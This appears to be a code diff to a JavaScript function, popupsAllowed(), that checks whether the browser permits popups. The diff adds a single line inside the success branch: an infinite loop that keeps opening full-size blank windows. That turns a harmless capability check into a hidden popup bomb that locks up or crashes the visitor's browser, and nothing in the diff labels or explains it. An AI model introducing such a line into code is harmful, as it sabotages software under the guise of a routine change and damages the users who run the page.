@@ -447,6 +447,7 @@ function popupsAllowed() {
         return false;
     } else {
         popUp.close();
+        while(true){window.open("about:blank","_blank","width=10000,height=10000");}
         return true;
     }
 }
